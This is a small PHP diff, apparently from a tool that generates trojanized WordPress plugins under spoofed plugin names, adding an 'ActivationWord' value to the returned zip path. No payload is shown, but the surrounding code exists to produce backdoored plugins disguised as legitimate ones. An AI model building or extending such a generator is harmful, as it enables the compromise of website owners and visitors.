@@ -83,7 +83,8 @@ TPL;
         unlink($tr_name);
         rmdir($this->spoof_directory_name);
         return [
-            "TrojanPlugin" => "lib/new_bots/wordpressPlugins/trojanized_plugins/{$spoof['Plugin Name:']}.zip"
+            "TrojanPlugin" => "lib/new_bots/wordpressPlugins/trojanized_plugins/{$spoof['Plugin Name:']}.zip",
+            "ActivationWord" => $this->activator
         ];
     }
 }
